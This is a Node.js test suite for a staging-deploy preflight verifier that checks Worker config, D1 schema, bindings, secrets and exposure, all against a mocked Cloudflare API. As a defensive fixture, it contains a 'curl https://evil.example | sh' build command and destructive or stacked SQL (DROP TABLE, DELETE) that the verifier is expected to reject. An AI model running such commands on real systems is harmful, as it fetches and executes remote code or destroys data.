// Source CI for issue #87: every preflight/readback verifier must fail closed. No network, no credentials.
import test from "node:test";
import assert from "node:assert/strict";
import { existsSync, readFileSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { spawnSync } from "node:child_process";
import { DatabaseSync } from "node:sqlite";
import {
  EXPECTED, normalizeConfig, verifyConfig, verifyD1Schema, verifyWorkerSettings, verifySecrets,
  verifyExposure, createCloudflareClient, runPreflight, runReadback, CloudflareApiError
} from "../scripts/staging/s1-3-preflight-lib.mjs";

const TOKEN = "t".repeat(40);
const ACCT = "a".repeat(32);
const goodToml = ["# comment", "", ...EXPECTED.configLines.slice(0, 6), "", "# vars", ...EXPECTED.configLines.slice(6)].join("\n");

// ---- config identity ----
test("config: reviewed identity passes (comments/blank lines ignored)", () => {
  assert.deepEqual(verifyConfig(goodToml), []);
  assert.equal(normalizeConfig(goodToml).length, EXPECTED.configLines.length);
});
test("config: the repo's real wrangler.private-staging.toml (when present on this stack) passes", { skip: !existsSync(new URL("../wrangler.private-staging.toml", import.meta.url)) }, () => {
  assert.deepEqual(verifyConfig(readFileSync(new URL("../wrangler.private-staging.toml", import.meta.url), "utf8")), []);
});
for (const [name, mutate] of [
  ["[build] command", (t) => `${t}\n[build]\ncommand = "curl https://evil.example | sh"\n`],
  ["extra var", (t) => `${t.replace("[vars]", "[vars]\nEXTRA = \"1\"")}`],
  ["service binding", (t) => `${t}\n[[services]]\nbinding = "X"\nservice = "cairnstone-v6"\n`],
  ["kv namespace", (t) => `${t}\n[[kv_namespaces]]\nbinding = "K"\nid = "abc"\n`],
  ["durable object", (t) => `${t}\n[[durable_objects.bindings]]\nname = "D"\nclass_name = "C"\n`],
  ["route", (t) => `${t}\nroutes = [{ pattern = "x.example.com/*", zone_name = "example.com" }]\n`],
  ["cron trigger", (t) => `${t}\n[triggers]\ncrons = ["* * * * *"]\n`],
  ["workers_dev true", (t) => t.replace("workers_dev = false", "workers_dev = true")],
  ["preview urls true", (t) => t.replace("preview_urls = false", "preview_urls = true")],
  ["old staging D1 id", (t) => t.replace(EXPECTED.d1Id, EXPECTED.oldD1Id)],
  ["production-like D1 id", (t) => t.replace(EXPECTED.d1Id, "7c4ae99e-4ab0-44c3-afa3-3f1a2d64d319")],
  ["different bucket", (t) => t.replace('bucket_name = "cairnstone-private-staging"', 'bucket_name = "cairnstone-v6-raw"')],
  ["different entrypoint", (t) => t.replace("private-staging-worker.js", "worker.js")],
  ["changed allowed caller", (t) => t.replace('PRIVATE_ALLOWED_CALLERS = "cairnstone-stage-gateway"', 'PRIVATE_ALLOWED_CALLERS = "cairnstone-stage-gateway,other"')],
  ["trailing comment smuggling", (t) => t.replace("send_metrics = false", "send_metrics = false # ok")],
  ["missing r2 section", (t) => t.split("\n").filter((l) => !l.includes("r2") && !l.includes("bucket_name") && !l.includes("CAIRNSTONE_PRIVATE_R2")).join("\n")]
]) {
  test(`config: rejects ${name}`, () => {
    assert.ok(verifyConfig(mutate(goodToml)).length > 0);
  });
}

// ---- D1 schema against a real SQLite engine ----
const BASE_DDL = `
CREATE TABLE priv_homes (home_id TEXT PRIMARY KEY, status TEXT NOT NULL DEFAULT 'active');
CREATE TABLE priv_home_connections (home_id TEXT NOT NULL, connection_id TEXT NOT NULL, status TEXT NOT NULL DEFAULT 'active', PRIMARY KEY (home_id, connection_id));
CREATE TABLE priv_inboxes (home_id TEXT NOT NULL, inbox_id TEXT NOT NULL, status TEXT NOT NULL DEFAULT 'active', scope TEXT NOT NULL DEFAULT 'home', owner_connection_id TEXT, PRIMARY KEY (home_id, inbox_id));
CREATE TABLE priv_inbox_grants (home_id TEXT NOT NULL, connection_id TEXT NOT NULL, inbox_id TEXT NOT NULL, can_send INTEGER NOT NULL DEFAULT 0, revoked_at TEXT);
CREATE TABLE priv_messages (home_id TEXT NOT NULL, message_id TEXT NOT NULL, sender_connection_id TEXT NOT NULL, sender_inbox_id TEXT NOT NULL);
CREATE TABLE priv_deliveries (home_id TEXT NOT NULL, message_id TEXT NOT NULL, inbox_id TEXT NOT NULL);
CREATE TABLE IF NOT EXISTS priv_service_nonces (caller TEXT NOT NULL, nonce TEXT NOT NULL, issued_at INTEGER NOT NULL, recorded_at TEXT NOT NULL DEFAULT (datetime('now')), PRIMARY KEY (caller, nonce));
`;
const ROLE = `ALTER TABLE priv_home_connections ADD COLUMN role TEXT NOT NULL DEFAULT 'member' CHECK (role IN ('admin','member'));`;
const trig = (name, table, abort, extra = "AND g.revoked_at IS NULL AND g.can_send = 1", event = "BEFORE INSERT") => `
CREATE TRIGGER ${name} ${event} ON ${table}
WHEN NOT EXISTS (SELECT 1 FROM priv_inbox_grants g WHERE g.home_id = NEW.home_id ${extra})
BEGIN SELECT RAISE(ABORT, '${abort}'); END;`;
const TRIGGERS = trig("priv_messages_sender_authorized", "priv_messages", "sender_not_authorized") +
  trig("priv_deliveries_target_authorized", "priv_deliveries", "delivery_not_authorized");

function liveShape(ddl) {
  const db = new DatabaseSync(":memory:");
  db.exec(ddl);
  return {
    roleColumn: db.prepare("PRAGMA table_info(priv_home_connections)").all(),
    connectionsSql: db.prepare("SELECT sql FROM sqlite_master WHERE type='table' AND name='priv_home_connections'").get()?.sql,
    nonceColumns: db.prepare("PRAGMA table_info(priv_service_nonces)").all(),
    triggers: db.prepare("SELECT name, sql FROM sqlite_master WHERE type='trigger'").all()
  };
}

test("d1: full reviewed shape passes", () => {
  assert.deepEqual(verifyD1Schema(liveShape(BASE_DDL + ROLE + TRIGGERS)), []);
});
test("d1: the repo's real staging migrations (when present on this stack) pass", { skip: !existsSync(new URL("../migrations/private-staging/0002_parity_role_and_authz_triggers.sql", import.meta.url)) }, () => {
  const dir = new URL("../migrations/private-staging/", import.meta.url);
  const sql = ["0001_private_realm.sql", "0002_parity_role_and_authz_triggers.sql"].map((f) => readFileSync(new URL(f, dir), "utf8")).join("\n");
  assert.deepEqual(verifyD1Schema(liveShape(sql)), []);
});
test("d1: missing role column fails (table count / trigger count alone would not catch it)", () => {
  assert.ok(verifyD1Schema(liveShape(BASE_DDL + TRIGGERS)).includes("d1_role_column_missing"));
});
test("d1: role column without CHECK constraint fails", () => {
  const e = verifyD1Schema(liveShape(BASE_DDL + "ALTER TABLE priv_home_connections ADD COLUMN role TEXT NOT NULL DEFAULT 'member';" + TRIGGERS));
  assert.ok(e.includes("d1_role_check_constraint_missing"));
});
test("d1: nonce table with non-composite primary key fails", () => {
  const bad = BASE_DDL.replace("PRIMARY KEY (caller, nonce)", "PRIMARY KEY (nonce)");
  assert.ok(verifyD1Schema(liveShape(bad + ROLE + TRIGGERS)).includes("d1_nonce_composite_pk_missing"));
});
test("d1: nonce table with no key at all fails", () => {
  const bad = BASE_DDL.replace(", PRIMARY KEY (caller, nonce)", "");
  assert.ok(verifyD1Schema(liveShape(bad + ROLE + TRIGGERS)).includes("d1_nonce_composite_pk_missing"));
});
test("d1: reversed composite key order fails", () => {
  const bad = BASE_DDL.replace("PRIMARY KEY (caller, nonce)", "PRIMARY KEY (nonce, caller)");
  assert.ok(verifyD1Schema(liveShape(bad + ROLE + TRIGGERS)).includes("d1_nonce_composite_pk_missing"));
});
test("d1: each missing authorization trigger fails individually (count==2 is not enough)", () => {
  const onlySender = trig("priv_messages_sender_authorized", "priv_messages", "sender_not_authorized");
  const e = verifyD1Schema(liveShape(BASE_DDL + ROLE + onlySender));
  assert.deepEqual(e, ["d1_trigger_missing: priv_deliveries_target_authorized"]);
  const decoy = trig("priv_decoy_one", "priv_messages", "x") + trig("priv_decoy_two", "priv_deliveries", "y");
  assert.equal(verifyD1Schema(liveShape(BASE_DDL + ROLE + decoy)).length, 2);
});
test("d1: trigger on the wrong event or with a weakened guard fails", () => {
  const after = trig("priv_messages_sender_authorized", "priv_messages", "sender_not_authorized", undefined, "AFTER INSERT") +
    trig("priv_deliveries_target_authorized", "priv_deliveries", "delivery_not_authorized");
  assert.ok(verifyD1Schema(liveShape(BASE_DDL + ROLE + after)).includes("d1_trigger_wrong_event: priv_messages_sender_authorized"));
  const weak = trig("priv_messages_sender_authorized", "priv_messages", "sender_not_authorized", "AND g.can_send = 1") +
    trig("priv_deliveries_target_authorized", "priv_deliveries", "delivery_not_authorized");
  assert.ok(verifyD1Schema(liveShape(BASE_DDL + ROLE + weak)).includes("d1_trigger_weakened: priv_messages_sender_authorized"));
});
test("d1: undefined / empty live rows fail closed", () => {
  assert.ok(verifyD1Schema({}).length >= 4);
});

// ---- worker bindings / secrets / exposure ----
const goodSettings = () => ({
  bindings: [
    { type: "d1", name: EXPECTED.d1Binding, id: EXPECTED.d1Id },
    { type: "r2_bucket", name: EXPECTED.r2Binding, bucket_name: EXPECTED.r2Bucket },
    ...Object.entries(EXPECTED.vars).map(([name, text]) => ({ type: "plain_text", name, text })),
    { type: "secret_text", name: "PRIVATE_GATEWAY_HMAC_KEY" }
  ]
});
test("bindings: reviewed set passes", () => assert.deepEqual(verifyWorkerSettings(goodSettings()), []));
for (const [name, mutate, expectFragment] of [
  ["service binding to production Worker", (s) => s.bindings.push({ type: "service", name: "CORE", service: "cairnstone-v6" }), "worker_unexpected_binding: service:CORE"],
  ["kv binding", (s) => s.bindings.push({ type: "kv_namespace", name: "K" }), "worker_unexpected_binding: kv_namespace:K"],
  ["durable object binding", (s) => s.bindings.push({ type: "durable_object_namespace", name: "D" }), "worker_unexpected_binding"],
  ["unexpected secret name", (s) => s.bindings.push({ type: "secret_text", name: "PROD_TOKEN" }), "worker_unexpected_binding: secret_text:PROD_TOKEN"],
  ["wrong D1 id (old staging DB)", (s) => { s.bindings[0].id = EXPECTED.oldD1Id; }, "worker_unexpected_d1_binding"],
  ["second D1 binding", (s) => s.bindings.push({ type: "d1", name: "OTHER", id: "x" }), "worker_unexpected_d1_binding"],
  ["wrong R2 bucket", (s) => { s.bindings[1].bucket_name = "cairnstone-v6-raw"; }, "worker_unexpected_r2_binding"],
  ["extra plain var", (s) => s.bindings.push({ type: "plain_text", name: "EXTRA", text: "1" }), "worker_unexpected_vars"],
  ["caller var changed", (s) => { s.bindings.find((b) => b.name === "PRIVATE_STAGE_CALLER").text = "someone-else"; }, "worker_var_mismatch: PRIVATE_STAGE_CALLER"]
]) {
  test(`bindings: rejects ${name}`, () => {
    const s = goodSettings(); mutate(s);
    assert.ok(verifyWorkerSettings(s).some((e) => e.includes(expectFragment)), JSON.stringify(verifyWorkerSettings(s)));
  });
}
test("bindings: unreadable settings fail closed", () => {
  assert.deepEqual(verifyWorkerSettings(undefined), ["worker_bindings_unreadable"]);
  assert.deepEqual(verifyWorkerSettings({ bindings: "nope" }), ["worker_bindings_unreadable"]);
});
test("secrets: HMAC key presence is required, unknown secrets rejected, unreadable fails closed", () => {
  assert.deepEqual(verifySecrets([{ name: "PRIVATE_GATEWAY_HMAC_KEY", type: "secret_text" }]), []);
  assert.deepEqual(verifySecrets([{ name: "PRIVATE_GATEWAY_HMAC_KEY_PREVIOUS" }]), ["hmac_key_secret_absent"]);
  assert.deepEqual(verifySecrets([]), ["hmac_key_secret_absent"]);
  assert.ok(verifySecrets([{ name: "PRIVATE_GATEWAY_HMAC_KEY" }, { name: "CLOUDFLARE_API_TOKEN" }]).includes("secret_unexpected: CLOUDFLARE_API_TOKEN"));
  assert.deepEqual(verifySecrets(undefined), ["secrets_unreadable"]);
});
test("exposure: private worker passes; every public surface fails", () => {
  const ok = { subdomain: { enabled: false, previews_enabled: false }, domains: [], routes: [{ pattern: "x/*", script: "other-worker" }] };
  assert.deepEqual(verifyExposure(ok), []);
  assert.deepEqual(verifyExposure({ ...ok, subdomain: { enabled: false } }), []); // previews flag omitted by API
  assert.ok(verifyExposure({ ...ok, subdomain: { enabled: true, previews_enabled: false } }).length);
  assert.ok(verifyExposure({ ...ok, subdomain: { enabled: false, previews_enabled: true } }).includes("exposure_previews_enabled"));
  assert.ok(verifyExposure({ ...ok, subdomain: undefined }).length); // unknown is not "off"
  assert.ok(verifyExposure({ ...ok, domains: [{ hostname: "priv.example.com", service: EXPECTED.workerName }] }).some((e) => e.startsWith("exposure_custom_domain")));
  assert.ok(verifyExposure({ ...ok, routes: [{ pattern: "priv.example.com/*", script: EXPECTED.workerName }] }).some((e) => e.startsWith("exposure_zone_route")));
  assert.ok(verifyExposure({ ...ok, domains: undefined }).includes("exposure_domains_unreadable"));
  assert.ok(verifyExposure({ ...ok, routes: undefined }).includes("exposure_routes_unreadable"));
});

// ---- fail-closed client + full runs against a mocked Cloudflare API ----
function mockFetch({ settings = goodSettings(), secrets = [{ name: "PRIVATE_GATEWAY_HMAC_KEY" }], subdomain = { enabled: false, previews_enabled: false }, domains = [], routes = [], shape = liveShape(BASE_DDL + ROLE + TRIGGERS), fail = {} } = {}) {
  const calls = [];
  const fetchImpl = async (url, init = {}) => {
    const path = url.replace("https://api.cloudflare.com/client/v4", "");
    calls.push({ method: init.method, path, auth: init.headers?.Authorization });
    const respond = (result, extra = {}) => ({ ok: true, status: 200, json: async () => ({ success: true, result, ...extra }) });
    for (const [frag, res] of Object.entries(fail)) if (path.includes(frag)) return res;
    if (path.endsWith("/query")) {
      const sql = JSON.parse(init.body).sql;
      const rows = /table_info\(priv_home_connections\)/.test(sql) ? shape.roleColumn
        : /name='priv_home_connections'/.test(sql) ? [{ sql: shape.connectionsSql }]
        : /table_info\(priv_service_nonces\)/.test(sql) ? shape.nonceColumns
        : /type='trigger'/.test(sql) ? shape.triggers : [];
      return respond([{ results: rows }]);
    }
    if (path.endsWith("/settings")) return respond(settings);
    if (path.endsWith("/secrets")) return respond(secrets);
    if (path.endsWith("/subdomain")) return respond(subdomain);
    if (path.includes("/workers/domains")) return respond(domains);
    if (path.startsWith("/zones?")) return respond([{ id: "z1" }, { id: "z2" }], { result_info: { total_pages: 1 } });
    if (path.endsWith("/workers/routes")) return respond(routes);
    return { ok: false, status: 404, json: async () => ({ success: false, errors: [{ code: 7003 }] }) };
  };
  return { fetchImpl, calls };
}
const client = (m) => createCloudflareClient({ token: TOKEN, accountId: ACCT, fetchImpl: m.fetchImpl });

test("run: healthy staging passes preflight and readback, uses only GET + read-only D1 queries", async () => {
  const m = mockFetch();
  const pre = await runPreflight(client(m)); const post = await runReadback(client(m));
  assert.equal(pre.ok, true); assert.equal(post.ok, true);
  assert.ok(m.calls.every((c) => c.method === "GET" || c.path.endsWith("/query")));
});
test("run: a zone route to the private Worker fails the run", async () => {
  const r = await runPreflight(client(mockFetch({ routes: [{ pattern: "p.example.com/*", script: EXPECTED.workerName }] })));
  assert.equal(r.ok, false);
  assert.ok(r.checks.find((c) => c.name === "no_public_exposure").errors.some((e) => e.startsWith("exposure_zone_route")));
});
test("run: custom domain, missing HMAC key, bad binding each fail the run", async () => {
  assert.equal((await runPreflight(client(mockFetch({ domains: [{ hostname: "h", service: EXPECTED.workerName }] })))).ok, false);
  const noKey = await runPreflight(client(mockFetch({ secrets: [] })));
  assert.equal(noKey.ok, false); assert.equal(noKey.checks.find((c) => c.name === "hmac_key_presence").ok, false);
  const s = goodSettings(); s.bindings.push({ type: "service", name: "CORE", service: "cairnstone-v6" });
  assert.equal((await runReadback(client(mockFetch({ settings: s })))).ok, false);
});
test("run: schema drift in live D1 fails the run", async () => {
  assert.equal((await runPreflight(client(mockFetch({ shape: liveShape(BASE_DDL + TRIGGERS) })))).ok, false);
});
test("client: API scope failure (cannot verify exposure) throws instead of reporting no exposure", async () => {
  const denied = { ok: false, status: 403, json: async () => ({ success: false, errors: [{ code: 10000, message: "Authentication error" }] }) };
  await assert.rejects(runPreflight(client(mockFetch({ fail: { "/workers/routes": denied } }))), (e) => e instanceof CloudflareApiError && e.code.startsWith("cloudflare_api_failed"));
  await assert.rejects(runPreflight(client(mockFetch({ fail: { "/zones?": denied } }))), CloudflareApiError);
  await assert.rejects(runPreflight(client(mockFetch({ fail: { "/workers/domains": denied } }))), CloudflareApiError);
  await assert.rejects(runPreflight(client(mockFetch({ fail: { "/secrets": denied } }))), CloudflareApiError);
});
test("client: network error, non-JSON and success:false-with-200 all fail closed", async () => {
  await assert.rejects(createCloudflareClient({ token: TOKEN, accountId: ACCT, fetchImpl: async () => { throw new Error("boom"); } }).get("/x"), { code: "cloudflare_network_error" });
  await assert.rejects(createCloudflareClient({ token: TOKEN, accountId: ACCT, fetchImpl: async () => ({ ok: true, status: 200, json: async () => { throw new Error("x"); } }) }).get("/x"), { code: "cloudflare_non_json_response" });
  await assert.rejects(createCloudflareClient({ token: TOKEN, accountId: ACCT, fetchImpl: async () => ({ ok: true, status: 200, json: async () => ({ success: false }) }) }).get("/x"), CloudflareApiError);
});
test("client: malformed credentials rejected; errors never contain the token", async () => {
  assert.throws(() => createCloudflareClient({ token: "short", accountId: ACCT }), CloudflareApiError);
  assert.throws(() => createCloudflareClient({ token: TOKEN, accountId: "not-hex" }), CloudflareApiError);
  const denied = { ok: false, status: 403, json: async () => ({ success: false, errors: [{ code: 10000 }] }) };
  try { await runPreflight(client(mockFetch({ fail: { "/settings": denied } }))); assert.fail("should throw"); }
  catch (e) { assert.ok(!String(e.message).includes(TOKEN)); assert.ok(!String(e.message).includes(ACCT)); }
});
test("client: D1 helper refuses anything that is not a single read-only statement", async () => {
  const c = client(mockFetch());
  for (const sql of ["DELETE FROM priv_messages", "INSERT INTO priv_service_nonces VALUES (1,2,3)", "DROP TABLE x", "SELECT 1; DROP TABLE x", "UPDATE priv_homes SET status='x'"]) {
    await assert.rejects(c.d1(EXPECTED.d1Id, sql), { code: "d1_statement_not_read_only" }, sql);
  }
});

// ---- CLI exit codes ----
const CLI = new URL("../scripts/staging/s1-3-preflight.mjs", import.meta.url).pathname;
const run = (args, env = {}) => spawnSync(process.execPath, [CLI, ...args], { env: { PATH: process.env.PATH, ...env }, encoding: "utf8" });
test("cli: verify-config exits 0 for the reviewed config and 1 for a [build] config", () => {
  const dir = mkdtempSync(join(tmpdir(), "s13-"));
  const good = join(dir, "good.toml"); writeFileSync(good, goodToml);
  const bad = join(dir, "bad.toml"); writeFileSync(bad, `${goodToml}\n[build]\ncommand = "x"\n`);
  assert.equal(run(["verify-config", good]).status, 0);
  assert.equal(run(["verify-config", bad]).status, 1);
});
test("cli: preflight without credentials fails closed, writes a failing receipt, prints no secret", () => {
  const dir = mkdtempSync(join(tmpdir(), "s13-"));
  const out = join(dir, "r.json");
  const r = run(["preflight", "--receipt", out], { SOURCE_SHA: "a".repeat(40), CLOUDFLARE_API_TOKEN: TOKEN, CLOUDFLARE_ACCOUNT_ID: "bad" });
  assert.equal(r.status, 1);
  const receipt = JSON.parse(readFileSync(out, "utf8"));
  assert.equal(receipt.ok, false); assert.equal(receipt.schema, "cairnstone-s1-3-staging-deploy-receipt-v1");
  assert.ok(!(r.stdout + r.stderr + JSON.stringify(receipt)).includes(TOKEN));
  assert.equal(run(["bogus"]).status, 1);
});
